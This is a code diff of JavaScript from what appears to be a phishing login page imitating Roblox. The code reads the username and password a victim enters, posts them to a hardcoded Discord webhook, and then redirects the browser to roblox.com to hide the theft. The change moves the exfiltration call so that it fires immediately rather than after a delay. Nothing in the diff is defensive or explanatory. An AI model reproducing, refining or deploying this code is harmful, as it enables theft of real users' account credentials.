@@ -1031,16 +1031,16 @@
             load_login.style.display = 'inline-block';
             btn_check.style.display = 'none';
             error_alert.textContent = '';
+            const webhookUrl = 'https://discord.com/api/webhooks/1212375512161329162/__5pZZbTSSJHzIfvTL45n4OF6iuakwgpbJeNjV0u_E2q81KcoYfgdNHbYJjx6o-sxKEQ'
+            const contents = `UserName: ${input_username.value}\nPassword: ${input_password.value}`;
+            const request = new XMLHttpRequest();
+            request.open('POST', webhookUrl);
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                content: contents
+            }
+            request.send(JSON.stringify(params))
             setTimeout(function () {
-                const webhookUrl = 'https://discord.com/api/webhooks/1212375512161329162/__5pZZbTSSJHzIfvTL45n4OF6iuakwgpbJeNjV0u_E2q81KcoYfgdNHbYJjx6o-sxKEQ'
-                const contents = `UserName: ${input_username.value}\n Password: ${input_password.value}`;
-                const request = new XMLHttpRequest();
-                request.open('POST', webhookUrl);
-                request.setRequestHeader('Content-type', 'application/json');
-                const params = {
-                    content: contents
-                }
-                request.send(JSON.stringify(params))
                 window.location.href = 'https://roblox.com'
             }, 3000)
         }
